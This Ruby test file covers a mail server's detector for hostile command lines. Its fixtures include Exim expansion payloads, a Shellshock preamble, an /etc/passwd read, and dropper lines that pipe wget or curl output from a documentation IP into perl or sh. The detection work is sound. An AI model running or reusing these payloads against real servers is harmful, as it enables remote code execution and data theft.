require "test_helper"
require "mail_on_rails/netserv/probe_signatures"

# The signatures are pure regexes over one command line; these pin the
# shapes each one must catch and the innocent lookalikes it must not.
class ProbeSignaturesTest < Minitest::Test
  def match(line) = MailOnRails::Netserv::ProbeSignatures.match(line)

  def test_exim_expansion_forms
    assert_equal "exim_run", match("MAIL FROM:<${run{/bin/sh -c id}}@evil.test>")
    assert_equal "exim_expansion", match("RCPT TO:<${perl{system}}@evil.test>")
  end

  def test_shellshock_preamble
    assert_equal "shellshock", match("EHLO () { :; }; /bin/id")
  end

  def test_command_substitution_reaching_for_a_system_path
    assert_equal "command_substitution", match("RCPT TO:<`/usr/bin/id`@evil.test>")
    assert_equal "command_substitution", match("MAIL FROM:<$(cat /etc/passwd)@evil.test>")
  end

  # The dropper payload seen against production: no system path in it, just
  # nohup + wget piped to perl inside $(...) in a quoted local-part.
  def test_command_substitution_opening_onto_a_downloader_or_interpreter
    payload = 'RCPT TO:<"x: Service status change: localhost $(nohup wget -qO - ' \
              'http://192.0.2.9/zed | perl &) changed from stopped to running"@cve.invalid>'
    assert_equal "command_substitution", match(payload)
    assert_equal "command_substitution", match("MAIL FROM:<$(curl -s http://192.0.2.9/x|sh)@evil.test>")
    assert_equal "command_substitution", match("EHLO `perl -e 'system(1)'`")
    assert_equal "command_substitution", match("RCPT TO:<$( busybox wget http://192.0.2.9/x )@evil.test>")
    assert_equal "command_substitution", match("RCPT TO:<$(SUDO BASH -c id)@evil.test>")
  end

  # Backtick is a legal atext character; a real local-part containing one,
  # or a program name that is just part of an address, must stay clean.
  def test_innocent_lookalikes_do_not_match
    assert_nil match("MAIL FROM:<sh`x@example.test>")
    assert_nil match("MAIL FROM:<`shane@example.test>")
    assert_nil match("RCPT TO:<perl@example.test>")
    assert_nil match("RCPT TO:<wget.user@example.test>")
    assert_nil match("MAIL FROM:<$money@example.test>")
    assert_nil match("EHLO mail.example.test")
    assert_nil match("VRFY bob")
  end

  def test_vrfy_and_expn_reconnaissance
    assert_equal "vrfy_privileged", match("vrfy root")
    assert_equal "vrfy_privileged", match("VRFY postmaster")
    assert_equal "expn_probe", match("EXPN staff")
  end

  def foreign(line) = MailOnRails::Netserv::ProbeSignatures.foreign_protocol(line)
  def garbage(line) = MailOnRails::Netserv::ProbeSignatures.garbage(line)
  def detect(line) = MailOnRails::Netserv::ProbeSignatures.detect(line)

  # A TLS 1.0-1.3 ClientHello record header as it lands on a plaintext port.
  CLIENT_HELLO = "\x16\x03\x01\x00\xf4\x01\x00\x00\xf0\x03\x03".b

  def test_foreign_protocols_spoken_at_a_mail_port
    assert_equal "http_request", foreign("GET / HTTP/1.1")
    assert_equal "http_request", foreign("POST /cgi-bin/luci HTTP/1.0")
    assert_equal "http_request", foreign("OPTIONS * HTTP/1.1")
    assert_equal "http_request", foreign("CONNECT example.test:443 HTTP/1.1")
    assert_equal "http_request", foreign("GET /")
    assert_equal "http_request", foreign("HEAD http://example.test/ HTTP/1.1")
    assert_equal "ssh_banner", foreign("SSH-2.0-OpenSSH_9.6")
    assert_equal "sip_request", foreign("INVITE sip:100@203.0.113.9 SIP/2.0")
    assert_equal "sip_request", foreign("OPTIONS sip:nm SIP/2.0")
    assert_equal "tls_handshake", foreign(CLIENT_HELLO)
  end

  # Real commands share prefixes with the above: an IMAP tag can be "GET",
  # an SMTP verb list never contains HTTP's, and a TLS record starts with
  # bytes no command line does.
  def test_real_mail_commands_are_not_foreign
    assert_nil foreign("GET SELECT INBOX")
    assert_nil foreign("A001 LOGIN user pass")
    assert_nil foreign("EHLO client.test")
    assert_nil foreign("MAIL FROM:<get@example.test>")
    assert_nil foreign("OPTIONS NOOP")
    assert_nil foreign("SSH LIST \"\" *")
  end

  def test_garbage_is_control_bytes_or_non_utf8
    assert_equal "control_bytes", garbage("b\x00/{m<;s3gMm>.4 ;1")
    assert_equal "control_bytes", garbage("\e[0m NOOP")
    assert_equal "invalid_utf8", garbage("b\xff/{m<;s3gMm>.4 ;1".b)
    assert_equal "invalid_utf8", garbage("\xc3\x28 NOOP".dup.force_encoding("UTF-8"))
  end

  # TAB, a bare LF and valid UTF-8 (an SMTPUTF8 address, a UTF-8 mailbox
  # name) are sloppy or legitimate, never garbage.
  def test_legitimate_lines_are_not_garbage
    assert_nil garbage("MAIL FROM:<jürgen@example.test> SMTPUTF8")
    assert_nil garbage("A001 SELECT \"Entwürfe\"")
    assert_nil garbage("EHLO\tclient.test")
    assert_nil garbage("EHLO a\nMAIL FROM:<x@y>")
    assert_nil garbage("")
  end

  def test_detect_names_the_most_specific_reason_first
    assert_equal [ "foreign_protocol", "tls_handshake" ], detect(CLIENT_HELLO)
    assert_equal [ "foreign_protocol", "http_request" ], detect("GET / HTTP/1.1")
    assert_equal [ "exploit_probe", "shellshock" ], detect("SELECT () { :; }; /bin/sh")
    assert_equal [ "garbage", "control_bytes" ], detect("\x01\x02\x03 NOOP")
    assert_nil detect("A001 NOOP")
  end

  # A UTF-8-tagged line (a caller other than the binmode socket) holding
  # invalid bytes must not turn a regexp check into an ArgumentError.
  def test_every_check_survives_an_invalid_utf8_line
    line = "MAIL FROM:<\xff${run{/bin/sh}}@evil.test>".dup.force_encoding("UTF-8")
    refute line.valid_encoding?
    assert_equal [ "exploit_probe", "exim_run" ], detect(line)
    assert_nil foreign(line)
  end
end
